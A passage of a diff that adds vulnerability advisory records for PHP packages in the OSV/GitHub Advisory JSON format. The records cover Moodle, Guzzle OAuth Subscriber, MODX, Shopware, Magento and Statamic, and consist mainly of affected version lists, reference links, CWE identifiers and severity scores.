+          "v3.2.6",
+          "v3.2.7",
+          "v3.2.8",
+          "v3.2.9",
+          "v3.3.0",
+          "v3.3.0-beta",
+          "v3.3.0-rc1",
+          "v3.3.0-rc2",
+          "v3.3.0-rc3",
+          "v3.3.1",
+          "v3.3.2",
+          "v3.3.3",
+          "v3.3.4",
+          "v3.3.5",
+          "v3.3.6",
+          "v3.3.7",
+          "v3.3.8",
+          "v3.3.9",
+          "v3.4.0",
+          "v3.4.0-beta",
+          "v3.4.0-rc1",
+          "v3.4.0-rc2",
+          "v3.4.0-rc3",
+          "v3.4.1",
+          "v3.4.2",
+          "v3.4.3",
+          "v3.4.4",
+          "v3.4.5",
+          "v3.4.6",
+          "v3.4.7",
+          "v3.4.8",
+          "v3.4.9",
+          "v3.5.0",
+          "v3.5.0-beta",
+          "v3.5.0-rc1",
+          "v3.5.1",
+          "v3.5.10",
+          "v3.5.11",
+          "v3.5.12",
+          "v3.5.13",
+          "v3.5.14",
+          "v3.5.15",
+          "v3.5.16",
+          "v3.5.17",
+          "v3.5.18",
+          "v3.5.2",
+          "v3.5.3",
+          "v3.5.4",
+          "v3.5.5",
+          "v3.5.6",
+          "v3.5.7",
+          "v3.5.8",
+          "v3.5.9",
+          "v3.6.0",
+          "v3.6.0-beta",
+          "v3.6.0-rc1",
+          "v3.6.0-rc2",
+          "v3.6.0-rc3",
+          "v3.6.1",
+          "v3.6.10",
+          "v3.6.2",
+          "v3.6.3",
+          "v3.6.4",
+          "v3.6.5",
+          "v3.6.6",
+          "v3.6.7",
+          "v3.6.8",
+          "v3.6.9",
+          "v3.7.0",
+          "v3.7.0-beta",
+          "v3.7.0-rc1",
+          "v3.7.0-rc2",
+          "v3.7.1",
+          "v3.7.2",
+          "v3.7.3",
+          "v3.7.4",
+          "v3.7.5",
+          "v3.7.6",
+          "v3.7.7",
+          "v3.7.8",
+          "v3.7.9",
+          "v3.8.0",
+          "v3.8.0-beta",
+          "v3.8.0-rc1",
+          "v3.8.1",
+          "v3.8.2",
+          "v3.8.3",
+          "v3.8.4",
+          "v3.8.5",
+          "v3.8.6",
+          "v3.8.7",
+          "v3.8.8",
+          "v3.8.9",
+          "v3.9.0",
+          "v3.9.0-beta",
+          "v3.9.0-rc1",
+          "v3.9.0-rc2",
+          "v3.9.0-rc3",
+          "v3.9.1",
+          "v3.9.10",
+          "v3.9.11",
+          "v3.9.12",
+          "v3.9.13",
+          "v3.9.14",
+          "v3.9.15",
+          "v3.9.16",
+          "v3.9.17",
+          "v3.9.18",
+          "v3.9.19",
+          "v3.9.2",
+          "v3.9.20",
+          "v3.9.21",
+          "v3.9.22",
+          "v3.9.23",
+          "v3.9.24",
+          "v3.9.25",
+          "v3.9.3",
+          "v3.9.4",
+          "v3.9.5",
+          "v3.9.6",
+          "v3.9.7",
+          "v3.9.8",
+          "v3.9.9",
+          "v4.0.0",
+          "v4.0.0-beta",
+          "v4.0.0-rc1",
+          "v4.0.0-rc2",
+          "v4.0.0-rc3",
+          "v4.0.0-rc4",
+          "v4.0.1",
+          "v4.0.10",
+          "v4.0.11",
+          "v4.0.12",
+          "v4.0.2",
+          "v4.0.3",
+          "v4.0.4",
+          "v4.0.5",
+          "v4.0.6",
+          "v4.0.7",
+          "v4.0.8",
+          "v4.0.9",
+          "v4.1.0",
+          "v4.1.0-beta",
+          "v4.1.0-rc1",
+          "v4.1.0-rc2",
+          "v4.1.0-rc3",
+          "v4.1.1",
+          "v4.1.10",
+          "v4.1.11",
+          "v4.1.12",
+          "v4.1.13",
+          "v4.1.14",
+          "v4.1.15",
+          "v4.1.16",
+          "v4.1.17",
+          "v4.1.18",
+          "v4.1.19",
+          "v4.1.2",
+          "v4.1.20",
+          "v4.1.21",
+          "v4.1.22",
+          "v4.1.3",
+          "v4.1.4",
+          "v4.1.5",
+          "v4.1.6",
+          "v4.1.7",
+          "v4.1.8",
+          "v4.1.9",
+          "v4.2.0-beta",
+          "v4.2.0-rc1"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/05/GHSA-22gj-8qj2-fj46/GHSA-22gj-8qj2-fj46.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-30943"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/moodle/moodle/commit/59d42e1ed23f916dcb47d53c745bef18a116d800"
+      },
+      {
+        "type": "WEB",
+        "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2188605"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/moodle/moodle"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/54TM5H5PDUDYXOQ7X7PPYWP4AJDAE73I"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/MZBWRVUJF7HI53XCJPJ3YJZPOV5HBRUY"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PBFSXRYLT4ICKJVQSRBAOUDMDRVSVBLS"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/54TM5H5PDUDYXOQ7X7PPYWP4AJDAE73I"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MZBWRVUJF7HI53XCJPJ3YJZPOV5HBRUY"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PBFSXRYLT4ICKJVQSRBAOUDMDRVSVBLS"
+      },
+      {
+        "type": "WEB",
+        "url": "https://moodle.org/mod/forum/discuss.php?d=446285"
+      },
+      {
+        "type": "WEB",
+        "url": "http://git.moodle.org/gw?p=moodle.git&a=search&h=HEAD&st=commit&s=MDL-77718"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-610",
+        "CWE-73"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2023-05-02T23:13:25Z",
+      "nvd_published_at": "2023-05-02T20:15:10Z",
+      "severity": "MODERATE"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-237r-r8m4-4q88",
+    "published": "2025-01-06T19:23:26Z",
+    "modified": "2026-07-15T22:00:51.159337328Z",
+    "aliases": [
+      "CVE-2025-21617"
+    ],
+    "summary": "Guzzle OAuth Subscriber has insufficient nonce entropy",
+    "details": "### Impact\n\nNonce generation does not use sufficient entropy nor a cryptographically secure pseudorandom source (https://github.com/guzzle/oauth-subscriber/blob/0.8.0/src/Oauth1.php#L192). This can leave servers vulnerable to replay attacks when TLS is not used.\n\n### Patches\n\nUpgrade to version 0.8.1 or higher.\n\n### Workarounds\n\nNo.\n\n### References\n\nIssue is similar to https://nvd.nist.gov/vuln/detail/CVE-2025-22376.",
+    "affected": [
+      {
+        "package": {
+          "name": "guzzlehttp/oauth-subscriber",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/guzzlehttp/oauth-subscriber"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "0.8.1"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.1.0",
+          "0.1.1",
+          "0.1.2",
+          "0.2.0",
+          "0.3.0",
+          "0.4.0",
+          "0.5.0",
+          "0.6.0",
+          "0.7.0",
+          "0.8.0"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/01/GHSA-237r-r8m4-4q88/GHSA-237r-r8m4-4q88.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/guzzle/oauth-subscriber/security/advisories/GHSA-237r-r8m4-4q88"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-21617"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/guzzle/oauth-subscriber/commit/92b619b03bd21396e51c62e6bce83467d2ce8f53"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/FriendsOfPHP/security-advisories/blob/master/guzzlehttp/oauth-subscriber/CVE-2025-21617.yaml"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/guzzle/oauth-subscriber"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/guzzle/oauth-subscriber/blob/0.8.0/src/Oauth1.php#L192"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/guzzle/oauth-subscriber/releases/tag/0.8.1"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-338"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2025-01-06T19:23:26Z",
+      "nvd_published_at": "2025-01-06T20:15:39Z",
+      "severity": "MODERATE"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-23gj-x27g-r34f",
+    "published": "2022-05-17T02:43:14Z",
+    "modified": "2025-04-22T19:27:13.623238Z",
+    "aliases": [
+      "CVE-2017-9069"
+    ],
+    "summary": "MODX Revolution allows overwriting .htaccess",
+    "details": "In MODX Revolution before 2.5.7, a user with file upload permissions is able to execute arbitrary code by uploading a file with the name .htaccess.",
+    "affected": [
+      {
+        "package": {
+          "name": "modx/revolution",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/modx/revolution"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "2.5.7"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-23gj-x27g-r34f/GHSA-23gj-x27g-r34f.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-9069"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/modxcms/revolution/pull/13423"
+      },
+      {
+        "type": "WEB",
+        "url": "https://citadelo.com/en/2017/04/modx-revolution-cms"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/modxcms/revolution"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-434"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2025-04-22T18:43:38Z",
+      "nvd_published_at": "2017-05-18T16:29:00Z",
+      "severity": "HIGH"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-243q-g9j3-qf6r",
+    "published": "2021-06-28T18:21:01Z",
+    "modified": "2024-12-02T05:43:05.729663Z",
+    "summary": "non-admin users can create integration role with administrator role",
+    "details": "### Impact\nnon-admin users can create integration role with administrator role\n\n### Patches\nWe recommend updating to the current version 6.4.1.1. You can get the update to 6.4.1.1 regularly via the Auto-Updater or directly via the download overview.\n\nhttps://www.shopware.com/en/download/#shopware-6\n\n### Workarounds\nFor older versions of 6.1, 6.2, and 6.3 corresponding security measures are also available via a plugin. For the full range of functions, we recommend updating to the latest Shopware version.\n\nhttps://store.shopware.com/en/detail/index/sArticle/518463/number/Swag136939272659\n",
+    "affected": [
+      {
+        "package": {
+          "name": "shopware/platform",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/shopware/platform"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "6.4.1.1"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "6.3.0.0",
+          "6.3.0.1",
+          "6.3.0.2",
+          "6.3.1.0",
+          "6.3.1.1",
+          "6.3.2.0",
+          "6.3.2.1",
+          "6.3.3.0",
+          "6.3.3.1",
+          "6.3.4.0",
+          "6.3.4.1",
+          "6.3.5.0",
+          "6.3.5.1",
+          "6.3.5.2",
+          "6.3.5.3",
+          "6.3.5.4",
+          "6.4.0.0",
+          "6.4.0.0-RC1",
+          "6.4.1.0",
+          "v6.0.0+ea2",
+          "v6.1.0",
+          "v6.1.0-rc1",
+          "v6.1.0-rc2",
+          "v6.1.0-rc3",
+          "v6.1.0-rc4",
+          "v6.1.1",
+          "v6.1.2",
+          "v6.1.3",
+          "v6.1.4",
+          "v6.1.5",
+          "v6.1.6",
+          "v6.2.0",
+          "v6.2.0-RC1",
+          "v6.2.1",
+          "v6.2.2",
+          "v6.2.3"
+        ],
+        "database_specific": {
+          "last_known_affected_version_range": "<= 6.4.1.0",
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/06/GHSA-243q-g9j3-qf6r/GHSA-243q-g9j3-qf6r.json"
+        }
+      },
+      {
+        "package": {
+          "name": "shopware/core",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/shopware/core"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "6.4.1.1"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "6.3.0.0",
+          "6.3.0.1",
+          "6.3.0.2",
+          "6.3.1.0",
+          "6.3.1.1",
+          "6.3.2.0",
+          "6.3.2.1",
+          "6.3.3.0",
+          "6.3.3.1",
+          "6.3.4.0",
+          "6.3.4.1",
+          "6.3.5.0",
+          "6.3.5.1",
+          "6.3.5.2",
+          "6.3.5.3",
+          "6.3.5.4",
+          "6.4.0.0",
+          "6.4.0.0-RC1",
+          "6.4.1.0",
+          "v6.0.0+ea2",
+          "v6.1.0",
+          "v6.1.0-rc1",
+          "v6.1.0-rc2",
+          "v6.1.0-rc3",
+          "v6.1.0-rc4",
+          "v6.1.1",
+          "v6.1.2",
+          "v6.1.3",
+          "v6.1.4",
+          "v6.1.5",
+          "v6.1.6",
+          "v6.2.0",
+          "v6.2.0-RC1",
+          "v6.2.1",
+          "v6.2.2",
+          "v6.2.3"
+        ],
+        "database_specific": {
+          "last_known_affected_version_range": "<= 6.4.1.0",
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/06/GHSA-243q-g9j3-qf6r/GHSA-243q-g9j3-qf6r.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/shopware/platform/security/advisories/GHSA-243q-g9j3-qf6r"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [],
+      "github_reviewed": true,
+      "github_reviewed_at": "2021-06-24T19:31:03Z",
+      "nvd_published_at": null,
+      "severity": "MODERATE"
+    }
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-2444-8gj8-6fmx",
+    "published": "2023-03-27T21:30:25Z",
+    "modified": "2025-03-04T16:42:03.781779Z",
+    "aliases": [
+      "CVE-2023-22247"
+    ],
+    "summary": "Magento Open Source allows XML Injection",
+    "details": "Adobe Commerce versions 2.4.4-p2 (and earlier) and 2.4.5-p1 (and earlier) are affected by an XML Injection vulnerability that could lead to arbitrary file system read. An unauthenticated attacker can force the application to make arbitrary requests via injection of arbitrary URLs. Exploitation of this issue does not require user interaction.",
+    "affected": [
+      {
+        "package": {
+          "name": "magento/community-edition",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/magento/community-edition"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "2.4.5-p1"
+              },
+              {
+                "fixed": "2.4.5-p2"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "2.4.5-p1"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/03/GHSA-2444-8gj8-6fmx/GHSA-2444-8gj8-6fmx.json"
+        }
+      },
+      {
+        "package": {
+          "name": "magento/community-edition",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/magento/community-edition"
+        },
+        "versions": [
+          "2.4.5"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/03/GHSA-2444-8gj8-6fmx/GHSA-2444-8gj8-6fmx.json"
+        }
+      },
+      {
+        "package": {
+          "name": "magento/community-edition",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/magento/community-edition"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "2.4.4-p1"
+              },
+              {
+                "fixed": "2.4.4-p3"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "2.4.4-p1",
+          "2.4.4-p2"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/03/GHSA-2444-8gj8-6fmx/GHSA-2444-8gj8-6fmx.json"
+        }
+      },
+      {
+        "package": {
+          "name": "magento/community-edition",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/magento/community-edition"
+        },
+        "versions": [
+          "2.4.4"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/03/GHSA-2444-8gj8-6fmx/GHSA-2444-8gj8-6fmx.json"
+        }
+      },
+      {
+        "package": {
+          "name": "magento/project-community-edition",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/magento/project-community-edition"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "last_affected": "2.0.2"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.1.0-alpha100",
+          "0.1.0-alpha101",
+          "0.1.0-alpha102",
+          "0.1.0-alpha103",
+          "0.1.0-alpha104",
+          "0.1.0-alpha105",
+          "0.1.0-alpha106",
+          "0.1.0-alpha107",
+          "0.1.0-alpha108",
+          "0.1.0-alpha89",
+          "0.1.0-alpha90",
+          "0.1.0-alpha91",
+          "0.1.0-alpha92",
+          "0.1.0-alpha93",
+          "0.1.0-alpha94",
+          "0.1.0-alpha95",
+          "0.1.0-alpha96",
+          "0.1.0-alpha97",
+          "0.1.0-alpha98",
+          "0.1.0-alpha99",
+          "0.42.0-beta1",
+          "0.42.0-beta10",
+          "0.42.0-beta11",
+          "0.42.0-beta2",
+          "0.42.0-beta3",
+          "0.42.0-beta4",
+          "0.42.0-beta5",
+          "0.42.0-beta6",
+          "0.42.0-beta7",
+          "0.42.0-beta8",
+          "0.42.0-beta9",
+          "0.74.0-beta1",
+          "0.74.0-beta10",
+          "0.74.0-beta11",
+          "0.74.0-beta12",
+          "0.74.0-beta13",
+          "0.74.0-beta14",
+          "0.74.0-beta15",
+          "0.74.0-beta16",
+          "0.74.0-beta2",
+          "0.74.0-beta3",
+          "0.74.0-beta4",
+          "0.74.0-beta5",
+          "0.74.0-beta6",
+          "0.74.0-beta7",
+          "0.74.0-beta8",
+          "0.74.0-beta9",
+          "1.0.0-beta",
+          "2.0.0",
+          "2.0.0-rc",
+          "2.0.0-rc2",
+          "2.0.1",
+          "2.0.2"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/03/GHSA-2444-8gj8-6fmx/GHSA-2444-8gj8-6fmx.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-22247"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/magento/magento2"
+      },
+      {
+        "type": "WEB",
+        "url": "https://helpx.adobe.com/security/products/magento/apsb23-17.html"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-91"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2025-03-04T16:18:00Z",
+      "nvd_published_at": "2023-03-27T21:15:00Z",
+      "severity": "HIGH"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-2497-6pwj-pwg7",
+    "published": "2026-06-26T22:12:21Z",
+    "modified": "2026-09-10T03:51:07.340245215Z",
+    "aliases": [
+      "CVE-2026-49288"
+    ],
+    "summary": "Statamic CMS: Missing authorization on Control Panel fieldtype endpoints allows disclosure of restricted resources",
+    "details": "### Impact\n\nAn authenticated Control Panel user could view metadata and content for resources they don't have permission to view, including entries, assets, users, roles, groups, and other configured resources. Depending on the resource, this could expose titles, custom field values, entry content, asset metadata, and the existence of users, roles, and groups. No data could be modified.\n\n### Patches\n\nThis has been fixed in 5.73.23 and 6.20.0.",
+    "affected": [
+      {
+        "package": {
+          "name": "statamic/cms",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/statamic/cms"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "5.73.23"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "v3.0.0",
+          "v3.0.0-beta.1",
+          "v3.0.0-beta.10",
+          "v3.0.0-beta.11",
+          "v3.0.0-beta.12",
+          "v3.0.0-beta.13",
+          "v3.0.0-beta.14",
+          "v3.0.0-beta.15",
+          "v3.0.0-beta.16",
+          "v3.0.0-beta.17",
+          "v3.0.0-beta.18",
+          "v3.0.0-beta.19",
+          "v3.0.0-beta.2",
+          "v3.0.0-beta.20",
+          "v3.0.0-beta.21",
+          "v3.0.0-beta.22",
+          "v3.0.0-beta.23",
+          "v3.0.0-beta.24",
+          "v3.0.0-beta.25",
+          "v3.0.0-beta.26",
+          "v3.0.0-beta.27",
+          "v3.0.0-beta.28",
+          "v3.0.0-beta.29",
+          "v3.0.0-beta.3",
+          "v3.0.0-beta.30",
+          "v3.0.0-beta.31",
+          "v3.0.0-beta.32",
+          "v3.0.0-beta.33",
+          "v3.0.0-beta.34",
+          "v3.0.0-beta.35",
+          "v3.0.0-beta.36",
+          "v3.0.0-beta.37",
+          "v3.0.0-beta.38",
+          "v3.0.0-beta.39",
+          "v3.0.0-beta.4",
+          "v3.0.0-beta.40",
+          "v3.0.0-beta.41",
+          "v3.0.0-beta.42",
+          "v3.0.0-beta.43",
+          "v3.0.0-beta.44",
+          "v3.0.0-beta.45",
+          "v3.0.0-beta.46",
+          "v3.0.0-beta.5",
+          "v3.0.0-beta.6",
+          "v3.0.0-beta.7",
+          "v3.0.0-beta.8",
+          "v3.0.0-beta.9",
+          "v3.0.1",
+          "v3.0.10",
+          "v3.0.11",
+          "v3.0.12",
+          "v3.0.13",
+          "v3.0.14",
+          "v3.0.15",
+          "v3.0.16",
+          "v3.0.17",
+          "v3.0.18",
+          "v3.0.19",
+          "v3.0.2",
+          "v3.0.20",
+          "v3.0.21",
+          "v3.0.22",
+          "v3.0.23",
+          "v3.0.24",
+          "v3.0.25",
+          "v3.0.26",
+          "v3.0.27",
+          "v3.0.28",
+          "v3.0.29",
+          "v3.0.3",
+          "v3.0.30",
+          "v3.0.31",
+          "v3.0.32",
+          "v3.0.33",
+          "v3.0.34",
+          "v3.0.35",
+          "v3.0.35.1",
+          "v3.0.36",
+          "v3.0.36.1",
+          "v3.0.37",
+          "v3.0.38",
+          "v3.0.39",
+          "v3.0.4",
+          "v3.0.40",
+          "v3.0.41",
+          "v3.0.42",
+          "v3.0.43",
+          "v3.0.44",
+          "v3.0.45",
+          "v3.0.46",
+          "v3.0.47",
+          "v3.0.48",
+          "v3.0.49",
+          "v3.0.5",
+          "v3.0.6",
+          "v3.0.7",
+          "v3.0.8",
+          "v3.0.9",
+          "v3.1.0",
+          "v3.1.0-alpha.1",
+          "v3.1.0-alpha.2",
+          "v3.1.0-alpha.3",
+          "v3.1.0-alpha.4",
+          "v3.1.0-beta.1",
+          "v3.1.0-beta.2",
+          "v3.1.0-beta.3",
+          "v3.1.1",
+          "v3.1.10",
+          "v3.1.11",
+          "v3.1.12",
+          "v3.1.13",
+          "v3.1.14",
+          "v3.1.15",
+          "v3.1.16",
+          "v3.1.17",
+          "v3.1.18",
+          "v3.1.19",
+          "v3.1.2",
+          "v3.1.20",
+          "v3.1.21",
+          "v3.1.22",
+          "v3.1.23",
+          "v3.1.24",
+          "v3.1.25",
+          "v3.1.26",
+          "v3.1.27",
+          "v3.1.28",
+          "v3.1.29",
+          "v3.1.3",
+          "v3.1.30",
+          "v3.1.31",
+          "v3.1.32",
+          "v3.1.33",
+          "v3.1.34",
+          "v3.1.35",
+          "v3.1.4",
+          "v3.1.5",
+          "v3.1.6",
+          "v3.1.7",
+          "v3.1.8",
+          "v3.1.9",
+          "v3.2.0",
+          "v3.2.0-beta.1",
+          "v3.2.1",
+          "v3.2.10",
+          "v3.2.11",
+          "v3.2.12",
+          "v3.2.13",
+          "v3.2.14",
+          "v3.2.15",
+          "v3.2.16",
+          "v3.2.17",
+          "v3.2.18",
+          "v3.2.19",
+          "v3.2.2",
+          "v3.2.20",
+          "v3.2.21",
+          "v3.2.22",
+          "v3.2.23",
+          "v3.2.24",
+          "v3.2.25",
+          "v3.2.26",
+          "v3.2.27",
+          "v3.2.28",
+          "v3.2.29",
+          "v3.2.3",
+          "v3.2.30",
+          "v3.2.31",
+          "v3.2.32",
+          "v3.2.33",
+          "v3.2.34",
+          "v3.2.35",
+          "v3.2.36",
+          "v3.2.37",
+          "v3.2.38",
+          "v3.2.39",
+          "v3.2.4",
+          "v3.2.5",
+          "v3.2.6",
+          "v3.2.7",
+          "v3.2.8",
+          "v3.2.9",
+          "v3.3.0",
+          "v3.3.0-beta.1",
+          "v3.3.0-beta.2",
+          "v3.3.0-beta.3",
+          "v3.3.0-beta.4",
+          "v3.3.0-beta.5",
+          "v3.3.0-beta.6",
+          "v3.3.0-beta.7",
+          "v3.3.1",
+          "v3.3.10",
+          "v3.3.11",
+          "v3.3.12",
+          "v3.3.13",
+          "v3.3.14",
+          "v3.3.15",
+          "v3.3.16",
+          "v3.3.17",
+          "v3.3.18",
+          "v3.3.19",
+          "v3.3.2",
+          "v3.3.20",
+          "v3.3.21",
+          "v3.3.22",
+          "v3.3.23",
+          "v3.3.24",
+          "v3.3.25",
+          "v3.3.26",
+          "v3.3.27",
+          "v3.3.28",
+          "v3.3.29",
+          "v3.3.3",
+          "v3.3.30",
+          "v3.3.31",
+          "v3.3.32",
+          "v3.3.33",
+          "v3.3.34",
+          "v3.3.35",
+          "v3.3.36",
+          "v3.3.37",
+          "v3.3.38",
+          "v3.3.39",
+          "v3.3.4",
+          "v3.3.40",
+          "v3.3.41",
+          "v3.3.42",
+          "v3.3.43",
+          "v3.3.44",
+          "v3.3.45",
+          "v3.3.46",
+          "v3.3.47",
+          "v3.3.48",
+          "v3.3.49",
+          "v3.3.5",
+          "v3.3.50",
+          "v3.3.51",
+          "v3.3.52",
+          "v3.3.53",
+          "v3.3.54",
+          "v3.3.55",
+          "v3.3.56",
+          "v3.3.57",
+          "v3.3.58",
+          "v3.3.59",
+          "v3.3.6",
+          "v3.3.60",
+          "v3.3.61",
+          "v3.3.62",
+          "v3.3.63",
+          "v3.3.64",
+          "v3.3.65",
+          "v3.3.66",
+          "v3.3.67",
+          "v3.3.68",
+          "v3.3.7",
+          "v3.3.8",
+          "v3.3.9",
+          "v3.4.0",
+          "v3.4.1",
+          "v3.4.10",
+          "v3.4.11",
+          "v3.4.12",
+          "v3.4.13",
+          "v3.4.14",
+          "v3.4.15",
+          "v3.4.16",
+          "v3.4.17",
+          "v3.4.2",
+          "v3.4.3",
+          "v3.4.4",
+          "v3.4.5",
+          "v3.4.6",
+          "v3.4.7",
+          "v3.4.8",
+          "v3.4.9",
+          "v4.0.0",
+          "v4.0.0-alpha.1",
+          "v4.0.0-alpha.2",
+          "v4.0.0-alpha.3",
+          "v4.0.0-alpha.4",
+          "v4.0.0-alpha.5",
+          "v4.0.0-beta.1",
+          "v4.0.0-beta.2",
+          "v4.0.0-beta.3",
+          "v4.0.0-beta.4",
+          "v4.1.0",
+          "v4.1.1",
+          "v4.1.2",
+          "v4.1.3",
+          "v4.10.0",
+          "v4.10.1",
+          "v4.10.2",
+          "v4.11.0",
+          "v4.12.0",
+          "v4.13.0",
+          "v4.13.1",
+          "v4.13.2",
+          "v4.14.0",
+          "v4.15.0",
+          "v4.16.0",
+          "v4.17.0",
+          "v4.18.0",
+          "v4.19.0",
+          "v4.2.0",
+          "v4.20.0",
+          "v4.21.0",
+          "v4.22.0",
+          "v4.23.0",
+          "v4.23.1",
+          "v4.23.2",
+          "v4.24.0",
+          "v4.25.0",
+          "v4.26.0",
+          "v4.26.1",
+          "v4.27.0",
+          "v4.28.0",
+          "v4.29.0",
+          "v4.3.0",
+          "v4.30.0",
+          "v4.31.0",
+          "v4.32.0",
+          "v4.33.0",
+          "v4.34.0",
+          "v4.35.0",
+          "v4.36.0",
+          "v4.37.0",
+          "v4.38.0",
+          "v4.39.0",
+          "v4.4.0",
+          "v4.40.0",
+          "v4.41.0",
+          "v4.42.0",
+          "v4.42.1",
